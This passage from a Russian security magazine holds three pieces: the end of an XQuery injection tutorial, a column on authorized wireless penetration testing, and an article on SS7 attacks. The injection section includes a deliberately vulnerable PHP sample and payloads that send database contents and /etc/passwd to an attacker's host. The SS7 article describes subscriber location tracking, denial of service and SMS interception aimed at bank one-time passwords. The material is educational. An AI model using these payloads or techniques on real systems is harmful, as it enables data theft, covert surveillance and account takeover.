            '/*[name()="FirstName" or name()="LastName"]/text()
             return <h3> {$i} </h3>';
            $query = $this->session->query($input);
            while($query->more()) {
                print $query->next()."\n";
            }
        }
        $query->close();
    }
    public function exit_db()
    {
        $this->session->close();
    }
}
# Получение пользовательских данных
if(
((($uid = $_GET["uid"]) == null) || !is_numeric($uid)) ||
 (($username = $_GET["username"]) == null)
){
    print "<h3>try use uid and username parameters for access to
           info</h3>";
    exit;
}
$db = new DB();
$db->connect();
# Вызов уязвимой функции
$db->select($uid, $username);
$db->exit_db();
?>

  В этом примере username является переменной, содержащей уязвимость
рассматриваемого класса. Результат запроса к базе данных не включается
в ответ от веб-приложения и не влияет детерминированным образом на его
содержимое. Содержимое users.xml приведено ниже.

<Root>
    <Users>
        <UID>57394309</UID>
        <FirstName>Gandalf</FirstName>
        <LastName>the Grey</LastName>
        <UserName>Mithrandir</UserName>
        <!--Stormcrow-->
        <Password>c5f7d86f237453de41c38a7d886c5a9c</Password>
        <Type> User </Type>
    </Users>
    …
</Root>

   Для реализации time-based атаки необходимо наличие конструкции if-
then (можно обойтись поддержкой ленивых вычислений) и конструкции язы-
ка, которая задерживает обработку запроса базой данных. Этого нет в XPath,
зато есть в XQuery. В качестве конструкции, вызывающей задержку, я исполь-
зую reverse(-9999 to 9999)=0. Таким образом, внедряемая конструкция при-
нимает вид: 1"and if (count(/*)=1) then reverse(-9999 to 9999)=0 else
1=1 and "1"="1. Если ее передать в качестве параметра username GET-запро-
са к веб-приложению из примера, то ответ от него придет с задержкой, так
как count(/*)=1 в XPath и XQuery всегда возвращает правду. Вместо этого
равенства для извлечения содержимого базы можно использовать функции,
применяемые в boolean-based методе.





Внедрение конструкций в XQuery-запрос к базе данных eXist-db


REQUEST-BASED
Извлечение содержимого базы данных time- и boolean-based методами —
процесс длительный, а область применения union-based сильно ограничена.
Возникает вопрос: как получить содержимое базы в тех же случаях, в которых
работают time- и boolean-based, но за меньшее время?
   Кроме того, хочется узнавать о наличии XPath/XQuery injection в момент
обработки запроса к базе данных. То есть чтобы база сама сообщала о сра-
батывании инъекции, минуя веб-приложение.
   Ответом на поставленный вопрос и решением озвученной проблемы будет
request-based метод. Он основан на функции doc, которая позволяет загру-
жать в базу XML-документы, расположенные на локальной или удаленной ма-
шине. Используемая в нем конструкция имеет вид: doc(concat("Your public
ip",encode-for-uri(name(/*1  ())). В результате ее выполнения обработчи-
ком языка XQuery на ваш публичный IP-адрес будет отправлен GET-запрос,
в котором в качестве пути будет присутствовать содержимое корневого узла
в URI-кодировке.





Request-based на практике

Функция doc также может использоваться для XXE-атаки на базу данных:
doc(concat("Your  public  ip",encode-for-uri(doc("Your  public  ip/
XXE.xml")))). При использовании этой конструкции в качестве пути будет
присутствовать результат обработки XML-документа, содержащего XXE.

ЧТЕНИЕ ЛОКАЛЬНЫХ ФАЙЛОВ
В последнем стандарте, который получил статус рекомендации W3C в 2014
году, появилась функция unparsed-text, позволяющая обрабатывать в за-
просе локальные файлы как последовательность символов. При ее исполь-
зовании с упомянутыми ранее методами можно читать локальные файлы.
Например, прочитать содержимое /etc/passwd, используя request-based
метод: doc(concat("Your  public  ip",encode-for-uri(unparsed-text("/etc/
passwd")))).

ЗАКЛЮЧЕНИЕ
Тема XPath/XQuery injection не ограничивается только лишь веб-приложе-
ниями и базами данных на основе XQuery. В следующий раз я постараюсь ос-
ветить тему обнаружения и эксплуатации уязвимостей этого класса для обра-
ботчиков на мобильных устройствах и веб-приложений, работающих базами
данных, которые не основаны на XQuery.
Взлом

Колонка Юрия Гольцева

WARDRIVING В КАЧЕСТВЕ
КОНСАЛТИНГОВОЙ УСЛУГИ



                       Юрий Гольцев
                                           Профессиональный whitehat,
                                              специалист по иб, еженедельно
                                          проводящий множество этичных
                                             взломов крупных организаций,
                                              редактор рубрики взлом, почетный
                                               член команды     .
                                         @Ygoltsev



  Тестирование на проникновение (penetration
   testing) — метод оценки безопасности компьютерных
  систем или сетей средствами моделирования атаки
  злоумышленника. Для кого-то это хобби, для кого-то
   работа, для кого-то это стиль жи`зни. На страницах
  нашего журнала мы постараемся познакомить тебя
  с профессией настоящего «этичного хакера», с зада-
   чами, которые перед ним ставятся, и их решениями.





INTRO
Лето — пора экзаменов и отпусков. К сожалению, отпуск не резиновый. Экза-
мены во всякого рода учебных заведениях — штука интересная, но для многих
давно позади. Я же хочу поговорить об экзаменах, когда в роли экзаменато-
ра выступает пентестер. Одно из таких испытаний подвигнет тебя выбраться
из душного офиса и провести день на открытом воздухе, рассекая по пустым
аллеям на лонгборде с ноутбуком в рюкзаке. Уверен, ты уже догадался, что
речь пойдет об анализе защищенности беспроводных сетей. Если ты слы-
шишь об этом впервые, то для начала можешь заглянуть в Википедию и почи-
тать статью Wardriving или найти соответствующий материал из апрельского
номера Х. Мы же поговорим о вардрайвинге как об услуге, востребованной
среди больших компаний.
   Анализ защищенности беспроводных сетей должен выявить недостатки
в эксплуатации точек доступа и клиентских устройств Wi-Fi для диапазонов 2,4
и 5 ГГц с использованием технологий 802.11a/b/g/n, а также недостатки в архи-
тектуре и организации беспроводного доступа. Услуга сводится к наглядной
демонстрации того, что потенциальный злоумышленник, обладающий некото-
рыми знаниями, способен получить доступ к тестируемой беспроводной сети.
Или не способен — если недостатков в реализации нет.
  В большинстве случаев подобная услуга бывает востребована в рамках
комплексного тестирования на проникновение. Оно подразумевает под со-
бой внешнее, внутреннее тестирование, а также, возможно, оценку осведом-
ленности сотрудников в вопросах ИБ. В моей практике не было случая, ког-
да какая-то отдельная компания просила исследовать только защищенность
беспроводных сетей.
   Сегодня мы с тобой рассмотрим состав подобных работ, их рамки и неко-
торые особенности.

СПОТ 1. ВБЛИЗИ ОФИСА ЗАКАЗЧИКА. ОФИЦИАЛЬНАЯ ЧАСТЬ
Перед началом работ, связанных с беспроводными сетями, этичному хакеру
необходимо согласовать дату и время их проведения, а также рассказать, что
именно будет сделано, продублировав устно строки из ТКП, чтобы избежать
недопонимания. На практике обычно вся совокупность работ, которые подра-
зумеваются под этой услугой, занимает три рабочих дня на один объект. Объ-
ект — понятие относительное, и под ним я подразумеваю здание офиса, в ко-
тором заказчик может занимать произвольное количество этажей.

ВНЕШНИЙ WI-FI-АДАПТЕР
Для анализа защищенности беспроводных сетей ты никак не сможешь обой-
тись без внешнего адаптера Wi-Fi, который как минимум обладает большей
мощностью, чем интегрированная карта. Выбор внешнего адаптера — вопрос
простой только на первый взгляд и напрямую зависит от целей, для которых его
планируется использовать. Тему отлично раскрыл Олег Купреев в рамках свое-
го выступления на первой встрече Defcon Moscow. Я настоятельно рекомендую
тебе ознакомиться с материалом этой презентации. Лично я использую Atheros
AR9271 AWUS036NHA от Alfa Networks, но думаю, что после доклада Олега пе-
ресмотрю свой выбор для некоторых из кейсов.




СПОТ 2. ПАРКИНГ И БЛИЗЛЕЖАЩАЯ ТЕРРИТОРИЯ. ДЕНЬ 1
После того как все детали и нюансы обговорены, в назначенный день пен-
тестер появляется в офисе заказчика и проводит «рекон» (разведку) в отно-
шении беспроводных сетей, доступных на территории. Рекон подразумевает
под собой составление списка всех доступных беспроводных сетей, а также
сбор информации о них и их клиентах. На практике такая разведка означа-
ет запуск airodump и неспешную прогулку по территории офиса. Рекомен-
дую давать понятные имена файлам, которые генерит airodump, — например,
floor_1_openspace. В дальнейшем такая привычка может существенно упро-
стить поиск места, где был сигнал от интересующей точки доступа. Попутно
желательно отмечать, какие именно точки доступа были в непосредственной
близости от твоего пути. Если в здании есть и другие арендаторы, то это помо-
жет определить, находится ли точка в офисе заказчика. В результате мы имеем
список беспроводных сетей, доступных на территории нужного офиса, а так-
же их характеристики (BSSID, CH, ENC, CIPHER, AUTH, ESSID, WPS). На рекон
в большой организации может уйти до нескольких часов.
   После рекона необходимо обсудить с техническим специалистом заказ-
чика список точек доступа, легитимных для его ИС. На этом этапе, используя
полученную информацию, уже можно выявить все точки доступа, которые, воз-
можно, несанкционировано подключены к ЛВС заказчика.
  Помимо территории офиса, необходимо собрать данные из всех публично
доступных мест здания, в котором расположен офис, а также в теории и по воз-
можности на практике оценить шансы на то, что сигнал будет доступен вне
здания.
   На основании информации, полученной на этапе рекона, этичный хакер со-
ставляет для себя список задач, каждая из которых отражает BSSID и ESSID
точки доступа, а также векторы атак, которые могут быть реализованы в ее
отношении. Например, task1/00:11:22:33:44:55/corp_wifi/WPAPSK_handshake_
pwn — на точке используется WPA, вектор атаки — попытаться перехватить
хендшейк и установить значение ключа. Грубо говоря, подобный список задач
в дальнейшем можно будет использовать как опору при подготовке описания
модели нарушителя.
   После того как разведка завершена, текущая картина защищенности
беспроводных сетей почти полностью ясна. Следующая задача этичного ха-
кера — продемонстрировать недочеты, которые были выявлены им на преды-
дущем этапе. Основная цель демонстрации — получение доступа к беспро-
водной сети. Имеется в виду не только успешное подключение к сети — сеть
может быть вообще открыта для всех желающих (например, гостиничный Wi-Fi
с аутентификацией после подключения), — а именно получение возможности
полноценной работы с сетью наравне с легитимными пользователями. В ход
идет все — от брутфорса WPS (современный аналог WEP по простоте век-
тора атаки) до перехвата и брутфорса хендшейков и поднятия фейковой точ-
ки доступа. На этом этапе необходимо наиболее полно продемонстрировать
на практике и задокументировать возможность (или невозможность) прове-
дения тех или иных атак.
   Не стоит забывать, что обязательным условием выполнения работ явля-
ется соблюдение принципов конфиденциальности, целостности и доступно-
сти информации. В данном случае я особенно хочу отметить принцип доступ-
ности информации: многие пренебрегают этим на этапе демонстрации атак
на беспроводные сети, к примеру безжалостно отправляя тоннами пакеты de-
auth.
   Этот процесс несложно автоматизировать — это даст выигрыш во времени.
В конце рабочего дня все данные, которые можно пробрутфорсить в офлайне
(например, WPA handshake), отправляются на брутфорс, если это не было сде-
лано ранее.

СПОТ 3. ДОРОГА ВДАЛЬ. ДЕНЬ 2
Второй рабочий день начнется с взаимодействия с вычислительными мощно-
стями, которые были озадачены брутфорсом. Если искомые значения найде-
ны — хорошо, если нет — не стоит расстраиваться: это значит, что они не столь
просты. После сбора всей информации необходимо встретиться с заказчиком
и с техническим контактом заказчика, чтобы обсудить текущий статус — объ-
яснить, удалось ли получить несанкционированный доступ или нет и почему.
В конце этой встречи пентестер запрашивает данные для подключения ко всем
перечисленным беспроводным сетям, а также конфигурации точек доступа
(если это возможно) для дальнейшего анализа. Вот тут уже можно понять, ка-
ковы были реальные шансы на успех брутфорса :). Эти данные необходимы
для анализа защищенности инфраструктурных ресурсов, а также для анализа
защищенности сети на канальном уровне.
   Беспроводные сети в организациях можно разделить на два основных
типа — гостевые и корпоративные. Гостевые сети дополнительно исследу-
ются на возможность получить доступ к корпоративной сети. Проверка всех
беспроводных сетей — дело долгое, так что расслабиться не получится. Ре-
комендую проводить подобные работы сразу с нескольких ноутбуков, чтобы
анализировать несколько сетей одновременно. К сожалению, в большинстве
случаев сама задача тривиальна и нудна. На подготовку отчета уйдет от одно-
го до трех рабочих дней в зависимости от количества информации, которую
требуется в нем отразить.

СПОТ 4. ПОДГОТОВКА ОТЧЕТА
По итогам анализа защищенности беспроводных сетей этичный хакер предо-
ставляет заказчику отчет. В нем должна быть отражена как минимум следую-
щая информация:
•  список точек беспроводного доступа, не соответствующих стандартам ин-
   формационной безопасности (использование методов защиты, для кото-
   рых есть документированные методы обхода, отсутствие механизмов за-
   щиты и так далее);
•  описание всех (удачных и неудачных) попыток несанкционированного до-
   ступа к беспроводным сетям заказчика;
•  описание проблем, которые позволили осуществить несанкционирован-
   ный доступ, а также рекомендации по их устранению;
•  описание проблем, выявленных в результате анализа защищенности ин-
   фраструктуры и канального уровня, и рекомендации по их устранению;
•  описание ошибок в конфигурации устройств точек доступа беспроводных
   сетей (если применимо);
•  радиус действия беспроводных сетей (если применимо);
•  список выявленных несанкционированных беспроводных точек доступа
   (если применимо).

OUTRO
На практике большинство беспроводных сетей сконфигурированы почти оди-
наково, и, соответственно, схожи и проблемы, равно как и пути их устранения.
К тому же новые методы атак в отношении механизмов защиты беспроводных
сетей — штука в текущих реалиях очень редкая. Так что большая часть работ,
которые следуют за реконом и сбором отчетных материалов, сводится к гра-
мотному составлению отчетов из готовых шаблонов.
   Все это на удивление не мешает подобной работе быть чертовски увлека-
тельной и интересной. И еще. Занимаясь практической информационной без-
опасностью, особенно на свежем воздухе и с ноутбуком в рюкзаке, не забывай,
что такие простые и замечательные вещи, как велосипед, ролики, самокат или
лонгборд, помогут совместить приятное с полезным и получить удовольствие
от хорошей погоды. Stay tuned!

ПОЛЕЗНАЯ ИНФОРМАЦИЯ

Общая теория по пентестам
•   Vulnerability Assessment
•  Open Source Security Testing Methodology Manual
•  The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•   Penetration Testing Practice Lab

В закладки
•  Open Penetration Testing Bookmarks Collection

Материал для начинающего вардрайвера
•  Вардрайвинг в нашем веке
•   Aircrack-ng
•  Лучшие инструменты пентестера: беспроводные сети
•  Вардрайвинг, сбор информации о беспроводных сетях
•  Атаки на беспроводные сети. Часть 1, Часть 2, Часть 3
•  HOWTO: Взломать Wi-Fi за 10 часов
•  Cтроим мощный комплекс для вардрайвинга

Ссылки Олега Купреева (http://bit.ly/1B0ZFCS)
•  Утилиты для взлома Wi-Fi
•  Материалы на тему взлома Wi-Fi
•   80211-tips-and-threats
Взлом
ИГРАЕМ
В АНБ
ВЗЛОМ МОБИЛЬНОЙ
СВЯЗИ ЧЕРЕЗ SS7:
ПЕРЕХВАТ SMS,
СЛЕЖКА И ПРОЧЕЕ





      Сергей Пузанков,
         Positive Technologies





Сегодня, наверное, нет человека, который не пользуется мобильной связью.
И мобильная связь уже не ограничивается телефонными звонками, SMS и ин-
тернетом. Зачастую к телефонному номеру привязаны банковская карта, элек-
тронная почта, аккаунты в соцсетях и на сайтах госуслуг, а также личный кабинет
абонента на сайте оператора. Когда говорят о безопасности мобильной свя-
зи, обычно упоминают защищенность радиотракта и крайне редко вспоминают
о сети сигнализации SS7. До последнего времени защищенность сигнальных
каналов сводилась к физической безопасности.
  На самом деле попасть в сигнальную сеть в технологиях традиционной те-
лефонии было практически невозможно. Но прогресс не стоит на месте, и с на-
чала XXI века на смену традиционной стала постепенно приходить IP-телефо-
ния. На любой персональный компьютер теперь можно установить несколько
бесплатных программ, и затем знание протоколов SS7 и умение программиро-
вать, умноженные на потраченное время, превращают этот компьютер в мощ-
ный инструмент преступника — была бы фантазия.

НЕМНОЖКО ТЕОРИИ
Но прежде чем дать фантазии разгуляться, сделаем небольшое отступление
и углубимся в технологию мобильной связи. В телефонных сетях, в том чис-
ле и мобильных, четко разделяются абонентский (голос или данные) и служеб-
ный трафик (например, для установления соединения). По сути, служебный
трафик — это и есть та самая система сигнализации № 7, включающая в себя
определенный набор протоколов, правил и сообщений.
   Адресация узлов в мобильной связи при взаимодействии между операто-
рами происходит не по IP-адресам, а по адресам Global Title, формат которых
напоминает телефонные номера. Адреса Global Title в обязательном порядке
должны входить в диапазон телефонных номеров, закрепленный за операто-
ром связи, а если на национальном уровне диапазоны разбиваются по регио-
нам, то и адреса Global Title узлов сети должны соответствовать региональным
диапазонам.
  Мы не станем здесь описывать весь стек протоколов SS7. Достаточно ска-
зать, что для взаимодействия узлов ядра мобильного оператора используется
протокол MAP — Mobile Application Part. Протокол MAP нацелен на реализацию
функций, присущих именно сетям мобильной связи, таких как аутентификация
и регистрация мобильного аппарата в сети, локализация абонента для совер-
шения входящего вызова, поддержка безразрывного речевого канала связи
при передвижении абонента. Каждой операции соответствуют определенные
сообщения протокола MAP со своим набором параметров. Далее упоминают-
ся различные сообщения, и по умолчанию все они будут принадлежать прото-
колу MAP.
  Мы привыкли использовать для мобильных коммуникаций обычные телефон-
ные номера. В технических терминах мобильной связи эти номера называются
MSISDN — Mobile Subscriber Integrated Services Digital Network Number. Этот
номер присваивается абоненту при заключении договора с мобильным опе-
ратором. Но в недрах сети связи абоненты адресуются по другому идентифи-
катору — IMSI (International Mobile Subscriber Identity), который привязывается
к конкретной SIM-карте. Подавляющее большинство операций требуют адре-
сации абонента именно по IMSI, следовательно, для проведения большинства
атак, направленных на конкретного абонента, злоумышленнику в первую оче-
редь нужно узнать этот идентификатор.
   Нужно также отметить, что в протоколах SS7 не заложены возможности
для обеспечения таких функций, как аутентификация узлов, фильтрация сооб-
щений по спискам доступа, динамическая маршрутизация новых узлов сети.
Все это позволяет потенциальному злоумышленнику достигать поставленных
целей.

ВАРИАНТЫ АТАК

Прелюдия
Итак, мы предполагаем, что злоумышленник получил доступ к сети SS7 и желает
провести на тебя, читатель, ряд атак. Полагаем, что злоумышленник знает те-
лефонный номер абонента-жертвы. Как было сказано раньше, злоумышленни-
ку первым делом нужно получить идентификатор IMSI, соответствующий теле-
фонному номеру жертвы. Для лучшего понимания процесса предлагаю сейчас
отвлечься от самой атаки и посмотреть сперва, как работает один из простей-
ших сервисов в мобильной связи — Short Message Service, «эсэмэски».

Как ходят SMS-сообщения
В первую очередь нужно отметить, что SMS-сообщения в мобильных сетях «хо-
дят» по каналам сигнализации, совершенно не затрагивая каналы голосово-
го и пакетного трафика. Для любой транзакции между двумя абонентами есть
источник и получатель. Абонент, отправляя SMS-сообщение, указывает те-
лефонный номер получателя и вводит текст. Однако в служебных полях сооб-
щения содержится адрес SMS-центра: этот узел отвечает за маршрутизацию
SMS-сообщений (и его адрес указан в каждом телефоне в настройках SMS-со-
общений). Схема прохождения SMS-сообщения приведена на рис. 1.


Рис. 1. Схема
прохождения
SMS-сообщения





1. Абонент Алекс отправляет SMS-сообщение абоненту Борису. Это сообще-
   ние по каналам сигнализации приходит на мобильный коммутатор MSC-1,
  обслуживающий абонента Алекса.
2. Коммутатор MSC-1 поймет, что это именно SMS, увидит в сообщении адрес
   SMS-центра и отправит по этому адресу SMS в сообщении MO-ForwardSM
   протокола MAP. Остановимся немного на этом сообщении. В нем указыва-
   ются следующие данные: номер MSISDN отправителя, номер MSISDN по-
   лучателя, текст SMS. И теперь SMS-центр сталкивается с непосильной за-
   дачей. Во-первых, дальнейшая передача SMS-сообщения требует знания
   IMSI абонента-получателя, во-вторых, SMS-центр ничего не знает о место-
   нахождении абонента. Не забудем, что речь идет о мобильной связи, и або-
   нент сегодня может быть в Москве, а завтра будет в Осло...
3. Но на самом деле не все так плохо, потому что в сети мобильной связи есть
   база данных абонентов — HLR, где регистрируются перемещения або-
   нентов с точностью до коммутатора. Именно в эту базу данных обращает-
   ся SMS-центр, чтобы получить IMSI абонента и адрес обслуживающего его
   коммутатора. SMS-центр отправляет сообщение SendRoutingInfoForSM
   протокола MAP, где в качестве параметра указывает номер MSISDN або-
   нента Бориса.
4. Как мы сказали, в базе данных HLR хранится адрес коммутатора, обслужи-
  вающего абонента в данный момент. Кроме того, в HLR хранятся соответ-
   ствия MSISDN и IMSI. Именно эти два параметра HLR и отдаст в ответном
  сообщении SendRoutingInfoForSM.
5. Теперь SMS-центр отправляет сообщение MT-ForwardSM на получен-
  ный адрес коммутатора, в котором передает текст SMS, указывает номер
  MSISDN отправителя (он отобразится при получении SMS), а абонента-по-
   лучателя адресует по IMSI.
6. Принимающий коммутатор отправляет SMS-сообщение абоненту Борису,
   получая данные о точном местонахождении абонента в своей базе данных.

Получение IMSI и прочих прелестей
Итак, с помощью сообщения SendRoutingInfoForSM SMS-центр получа-
ет IMSI абонента и адрес обслуживающего коммутатора по телефонному но-
меру. Если принять, что в схеме прохождения SMS-сообщения Алекс и Бо-
рис являются абонентами разных сетей, то мы обнаружим, что сообщение
SendRoutingInfoForSM ходит между сетями (рис. 2).


Рис. 2. Прохожде-
ние SMS-сообщения
между сетями





   Для того чтобы SMS-центр смог сделать запрос, он должен «знать» адрес
HLR чужой сети. Хотя... на самом деле это необязательно. SMS-центр может от-
править сообщение SendRoutingInfoForSM, используя в качестве Global Title
телефонный номер абонента-получателя. Так как адреса Global Title и телефон-
ная нумерация находятся в едином диапазоне, сообщение будет доставлено
в сеть получателя, а далее по телефонному номеру смаршрутизировано на со-
ответствующий HLR. В ответном сообщении HLR раскроет свой адрес, а в виде
параметров передаст адрес MSC и IMSI абонента.
  В итоге получается, что злоумышленник, подключившийся к сети SS7, для со-
вершения своих атак изначально может знать только лишь номер атакуемо-
го абонента. Отправив сообщение SendRoutingInfoForSM, он получит адрес
HLR, адрес MSC и IMSI абонента.

ОПРЕДЕЛЕНИЕ МЕСТОПОЛОЖЕНИЯ АБОНЕНТА
А теперь перейдем к настоящим атакам. Первое, что приходит на ум, — опре-
делить, где находится абонент. Наверняка в недрах мобильной сети должна
быть информация о текущем положении абонента. И на самом деле она там
есть, правда точность ее не всегда одинакова. Чтобы прояснить этот вопрос,
придется опять погрузиться в технологию связи.

Структура сотовых сетей
Каждый видел антенны базовых станций сотовой связи: в городах ими усеяны
практически все высотные здания. За пределами городской застройки антен-
ны базовых станций чаще всего устанавливают на специальных мачтовых соо-
ружениях. Базовые станции обеспечивают радиопокрытие сети, которое в иде-
але, конечно, должно быть без белых пятен. Базовые станции подключаются
к контроллерам — BSC (Base Station Controller) в стандарте GSM и RNC (Radio
Network Controller) в стандарте UMTS. Контроллеры подключаются к коммута-
тору MSC.
  На базовой станции, как правило, устанавливают несколько антенн, каждая
из которых покрывает свой сектор, или соту. Каждая сота имеет идентификатор
CID — Cell ID. Соты объединяются в группы, называемые Location Area, и опре-
деляются идентификатором LAC — Location Area Code. Часто в Location Area
входят все сектора, базовые станции которых подключены к одному контрол-
леру.
   Идентификатор соты, обслуживающей абонента в каждый момент времени,
хранится в базе данных контроллера. Но контроллеры — и BSC, и RNC — под-
ключаются напрямую к коммутатору и не имеют подключений к внешним сетям.
Вытянуть оттуда информацию практически невозможно.
  Каждый MSC тоже имеет свою базу — VLR (Visited Location Register), где хра-
нится информация обо всех абонентах, попавших в зону действия этого комму-
татора. Там даже есть данные LAC и CID для абонентов, но значение CID обнов-
ляется только в тот момент, когда абонент переходит через границы Location
Area или совершает какое-либо другое активное действие. Хотя с точки зрения
сети изменение информации о новом LAC — это такая же активность, как и те-
лефонный звонок.
   Коммутатор, в отличие от контроллеров, имеет соединение с внешними се-
тями, и злоумышленник с доступом к SS7 может получить из его базы данных
информацию о местоположении абонентов.

Трехходовка
Теперь, когда мы знаем, как строятся сети мобильной связи, нам легко будет ра-
зобраться в технике атаки. Первый ход абсолютно повторяет действия для по-
лучения IMSI абонента и адреса обслуживающего его коммутатора. Повторим:
это делается с помощью сообщения SendRoutingInfoForSM (злоумышленник
эмулирует работу SMS-центра).
  На этом этапе можно было бы сразу отправить запрос в базу данных комму-
татора, но в таком случае мы рискуем получить не самую точную информацию,
поскольку не можем быть уверены, совершал ли телефон известного абонента
какие-либо активные действия в той соте, где он сейчас находится. Чтобы знать
наверняка, нам нужно заставить телефон абонента произвести подобные дей-
ствия, но сделать это нужно так, чтобы абонент ничего не заметил.
   Стандарт для SMS-сообщений подразумевает возможность сформировать
сообщение таким образом, что оно будет невидимым для абонента, так назы-
ваемое Silent SMS. Телефон принимает сообщение, но не сигнализирует о его
получении и не отображает его в списке принятых SMS.
  Вторым ходом злоумышленник продолжает эмулировать работу SMS-цен-
тра. Он отправляет Silent SMS искомому абоненту в сообщении MT-ForwardSM.
Само сообщение отправляется на коммутатор, адрес которого был получен
на первом ходе, а адресация абонента происходит по IMSI. После прохожде-
ния этого сообщения информация о местоположении абонента в базе комму-
татора обновится. Теперь там содержатся данные об актуальных LAC и CID.
   Осталось совсем немного — отправить запрос в коммутатор для полу-
чения данных об обслуживающей абонента соте. Это делается сообщением
ProvideSubscriberInfo, которое отправляется на коммутатор, абонент адре-
суется по IMSI. (Как мы помним, и адрес коммутатора, и IMSI абонента у нас
уже есть.) В сетях мобильной связи это сообщение используется для передачи
информации о местоположении вызываемого абонента для онлайн-тарифика-
ции. Если абонент находится в роуминге, включается соответствующая тари-
фикационная схема.
  Сообщение ProvideSubscriberInfo возвращает полный набор иденти-
фикаторов обслуживающей соты: MCC — Mobile Country Code, MNC — Mobile
Network Code, LAC, CID. В интернете много сервисов, позволяющих по этим че-
тырем параметрам определить географические координаты базовой станции
и даже примерную зону покрытия соты. На рис. 3 показан результат определе-
ния моего местоположения в момент написания этой статьи. Точкой отмече-
на базовая станция, а здание, где я сижу, действительно находится в пределах
указанного круга.





Рис. 3. Определение местоположения автора статьи

НАРУШЕНИЕ ДОСТУПНОСТИ АБОНЕНТА (DOS)
Следующая атака — DoS абонента. Для понимания техники атаки снова погру-
зимся в принципы работы сетей мобильной связи.

Регистрация абонента в роуминге
Рассмотрим сигнальный обмен и основные процессы, происходящие в сетях
мобильной связи, когда абонент уезжает в другую страну и регистрируется
в сети роуминг-партнера оператора (схема на рис. 4).


Рис. 4. Регистрация
абонента в сети
роуминг-партнера





1. Абонент Алекс из сети с названием «Дом» едет в отпуск на море, выходя
   из самолета, включает телефон и попадает в сеть «Заграница».
2. Коммутатор MSC Z по первым цифрам IMSI определят страну и сеть, откуда
   прибыл абонент, и отправляет в эту сеть запрос на аутентификацию абонен-
   та — сообщение SendAuthenticationInfo.
3. Узел, который отвечает за аутентификацию и назначение ключей шифрова-
   ния, называется AuC — Authentication Centre. Он определяет ключ шифро-
   вания и другую служебную информацию, необходимую для аутентификации,
   и отправляет ее в ответ.
4. После того как абонент аутентифицирован, нужно произвести его регистра-
  цию на новом коммутаторе MSC Z. Коммутатор отправляет в сеть «Дом» за-
   прос на регистрацию — сообщение UpdateLocation. Это сообщение при-
   ходит на HLR.
5. Получив сообщение UpdateLocation, HLR отправляет на коммутатор MSC
  D (где абонент был зарегистрирован ранее) сообщение CancelLocation,
   сообщая, чтобы он высвободил память от профиля абонента Алекса. Затем
  HLR в своей базе данных обновляет текущий адрес коммутатора на MSC Z.
6. В ответ на запрос регистрации HLR отправляет на MSC Z профиль абонента
   в сообщении InsertSubscriberData. В этом профиле указаны подключен-
  ные услуги абонента и адреса интеллектуальных платформ, если абонент
   подписан на соответствующие услуги. Чаще всего в качестве интеллекту-
   альной платформы выступает среди прочего система онлайн-тарификации.

После завершения этих действий абонент Алекс может совершать и прини-
мать звонки в сети «Заграница». При входящем вызове в HLR будет приходить
запрос о местоположении абонента, и он будет направлять вызовы на MSC Z
сети «Заграница».

Проведение атаки
Что остается сделать злоумышленнику, чтобы отправить абонента в DoS
для входящих вызовов? Просто послать в домашнюю сеть абонента сообщение
UpdateLocation от имени MSC. Схема сигнального обмена показана на рис. 5.

Рис. 5. DoS-атака





1. Сообщение отправляется на HLR, абонент адресуется по идентификатору
   IMSI (мы уже умеем получать необходимые данные). Еще один из параме-
   тров сообщения UpdateLocation — адрес нового коммутатора.
2. HLR в своей базе данных отвяжет реальный коммутатор.
3. HLR отправит профиль абонента на оборудование злоумышленника.

Таким образом, абонент окажется вне зоны действия сети для входящих вызо-
вов до тех пор, пока не случится одно из событий:
•  абонент переместится в зону действия другого коммутатора;
•  абонент перезагрузит телефон;
•  абонент совершит звонок или отправит SMS-сообщение.

Любое из этих действий инициирует процедуру UpdateLocation, которая в базе
данных HLR обновит адрес коммутатора на настоящий.

ПЕРЕХВАТ SMS

Следствие предыдущей атаки
Мы уже привели всю теоретическую базу, необходимую для понимания мето-
дики перехвата SMS-сообщений. Фактически перехват SMS является след-
ствием предыдущей атаки, если в качестве поддельного MSC злоумышленник
укажет адрес своего оборудования. Рассмотрим на примере, как происходит
перехват SMS-сообщений (рис. 6). Считаем, что злоумышленник получил все
нужные идентификаторы абонента Бориса и провел на него успешную DoS-а-
таку, указав в качестве фальшивого MSC адрес своего узла.


Рис. 6. Перехват
SMS-сообщения





1. Абонент Алекс отправляет SMS-сообщение абоненту Борису, это сообще-
   ние приходит на коммутатор, обслуживающий отправителя.
2. Коммутатор переправляет сообщение на SMS-центр. Как мы уже знаем, это
   происходит в сообщении MO-ForwardSM протокола MAP.
3. SMS-центр не знает, где в настоящий момент находится абонент Борис, по-
   этому он отправляет запрос в HLR в сообщении SendRoutingInfoForSM.
4. Поскольку на абонента Бориса была проведена успешная DoS-атака,
   в базе данных HLR содержится ложная информация о его местоположении.
   Эту ложную информацию и отдаст HLR SMS-центру в ответном сообщении
   SendRoutingInfoForSM.
5. SMS-центр, ничего не заподозрив, направит SMS-сообщение в открытом
   виде на полученный адрес в сообщении MT-ForwardSM протокола MAP.
  А за этим адресом, как мы уже говорили, скрывается наш злоумышленник.

Возможности для злоумышленника
Давай предположим, какую выгоду может получить злоумышленник, перехва-
тывая входящие абоненту SMS. Думается, что эта атака неэффективна в це-
лях вторжения в частную переписку: сейчас люди общаются в основном в при-
ложениях-мессенджерах. Гораздо интереснее получить одноразовый пароль
из банка для осуществления платежа. Преступным группировкам, которые
специализируются на взломах счетов банковских карт, зачастую для вывода
средств не хватает именно одноразовых паролей.
  Еще один из сценариев атак, при котором может использоваться перехват
SMS, — восстановление паролей для различных интернет-сервисов: для элек-
тронной почты, социальных сетей, порталов госуслуг. Во всех этих сервисах
может содержаться конфиденциальная информация, и ценность ее тем выше,
чем более громким именем обладает жертва.
   Практически у всех мобильных операторов пароль для доступа в личный ка-
бинет абонента запрашивается по SMS. Получив доступ в личный кабинет, зло-
умышленник может управлять услугами, переводить средства между счетами,
в некоторых случаях — просматривать историю SMS-сообщений.

ПОДВОДЯ ИТОГИ
В завершение хотелось бы сказать пару слов о том, как операторы сотовой
связи смотрят на безопасность SS7. Во-первых, они полагают (и небезоснова-
тельно), что невозможно получить абсолютно нелегальный доступ к сети SS7.
Во-вторых, между всеми операторами есть соглашения на пропуск трафика,
и даже если вдруг со стороны какого-то оператора будут замечены злонаме-
ренные действия, то не составит труда провести блокировку по адресу источни-
ка. В-третьих, не так много известно случаев злоупотребления средствами SS7.
  Все три утверждения совершенно справедливы. Однако для каждого из них
есть свое но.
   Первое но. Получить подключение к SS7 возможно, например, под прикры-
